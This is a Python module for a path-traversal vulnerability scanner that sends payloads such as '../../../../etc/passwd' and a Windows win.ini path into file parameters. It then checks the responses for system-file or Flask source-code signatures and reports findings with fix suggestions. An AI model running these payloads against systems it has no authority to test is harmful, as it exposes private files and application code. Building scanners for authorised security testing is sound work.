from typing import Any
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

import requests


TRAVERSAL_PAYLOADS = [
    "../app.py",
    "../../app.py",
    "../../../app.py",
    "../../../../etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
]

LIKELY_FILE_PARAMS = {
    "file", "filename", "path", "filepath", "name", "template", "page"
}

SYSTEM_FILE_PATTERNS = [
    "root:x:0:0:",
    "/bin/bash",
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
]

SOURCE_CODE_PATTERNS = [
    "from flask import",
    "app = Flask(",
    "@app.route(",
    "render_template(",
    "sqlite3",
    "os.path.join(",
]

ERROR_PATTERNS = [
    "Error:",
    "No such file or directory",
    "Is a directory",
]


def build_url_with_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    query_pairs = parse_qsl(parsed.query, keep_blank_values=True)

    updated = []
    found = False

    for key, old_value in query_pairs:
        if key == param:
            updated.append((key, value))
            found = True
        else:
            updated.append((key, old_value))

    if not found:
        updated.append((param, value))

    new_query = urlencode(updated, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def build_post_data(target: dict[str, Any], payload_param: str, payload_value: str) -> dict[str, str]:
    data = {}
    current_param = target.get("param", "")
    if current_param:
        data[current_param] = payload_value
    else:
        data[payload_param] = payload_value
    return data


def find_first_pattern(text: str, patterns: list[str]) -> str | None:
    lowered = text.lower()
    for pattern in patterns:
        if pattern.lower() in lowered:
            return pattern
    return None


def get_evidence_snippet(text: str, keyword: str, radius: int = 80) -> tuple[str, int]:
    idx = text.lower().find(keyword.lower())
    if idx == -1:
        return "", -1

    start = max(0, idx - radius)
    end = min(len(text), idx + len(keyword) + radius)
    return text[start:end], idx


class TraversalScanner:
    def __init__(self, timeout: int = 5, session: requests.Session | None = None):
        self.timeout = timeout
        self.session = session or requests.Session()

    def scan(self, target: dict[str, Any]) -> list[dict[str, Any]]:
        findings = []

        url = target.get("url", "")
        param = target.get("param", "")

        if not url or not param:
            return findings

        if param.lower() not in LIKELY_FILE_PARAMS:
            return findings

        baseline_text = self._safe_request_text(target, "test.txt")

        for payload in TRAVERSAL_PAYLOADS:
            body = self._safe_request_text(target, payload)
            if body is None:
                continue

            finding = self._analyze_response(
                url=url,
                param=param,
                payload=payload,
                body=body,
                baseline_text=baseline_text,
            )
            if finding:
                findings.append(finding)
                break

        return findings

    def _safe_request_text(self, target: dict[str, Any], payload: str) -> str | None:
        try:
            response = self._send_payload(target, payload)
            return response.text
        except requests.RequestException:
            return None

    def _send_payload(self, target: dict[str, Any], payload: str) -> requests.Response:
        method = target.get("method", "GET").upper()
        url = target.get("url", "")
        param = target.get("param", "")

        if method == "GET":
            test_url = build_url_with_param(url, param, payload)
            return self.session.get(test_url, timeout=self.timeout)

        if method == "POST":
            data = build_post_data(target, param, payload)
            return self.session.post(url, data=data, timeout=self.timeout)

        raise requests.RequestException(f"Unsupported method: {method}")

    def _analyze_response(
        self,
        url: str,
        param: str,
        payload: str,
        body: str,
        baseline_text: str | None,
    ) -> dict[str, Any] | None:
        error_hit = find_first_pattern(body, ERROR_PATTERNS)
        if error_hit:
            return None

        system_hit = find_first_pattern(body, SYSTEM_FILE_PATTERNS)
        if system_hit:
            snippet, index = get_evidence_snippet(body, system_hit)
            return {
                "type": "path_traversal",
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": f"system file content detected: {system_hit}, offset={index}, snippet={snippet}",
                "severity": "high",
                "verified": True,
                "suggestion": "restrict file access to a safe base directory and validate filenames with an allowlist",
            }

        source_hit = find_first_pattern(body, SOURCE_CODE_PATTERNS)
        if source_hit:
            snippet, index = get_evidence_snippet(body, source_hit)
            return {
                "type": "path_traversal",
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": f"application source code detected: {source_hit}, offset={index}, snippet={snippet}",
                "severity": "high",
                "verified": True,
                "suggestion": "restrict file access to a safe base directory and validate filenames with an allowlist",
            }

        if baseline_text is not None and self._looks_like_successful_escape(payload, body, baseline_text):
            return {
                "type": "path_traversal",
                "url": url,
                "param": param,
                "payload": payload,
                "evidence": "response is substantially different from baseline and does not contain file-read error",
                "severity": "medium",
                "verified": True,
                "suggestion": "restrict file access to a safe base directory and validate filenames with an allowlist",
            }

        return None

    @staticmethod
    def _looks_like_successful_escape(payload: str, body: str, baseline_text: str) -> bool:
        if "../" not in payload and "..\\" not in payload:
            return False

        if body == baseline_text:
            return False

        length_diff = abs(len(body) - len(baseline_text))
        return length_diff > 120
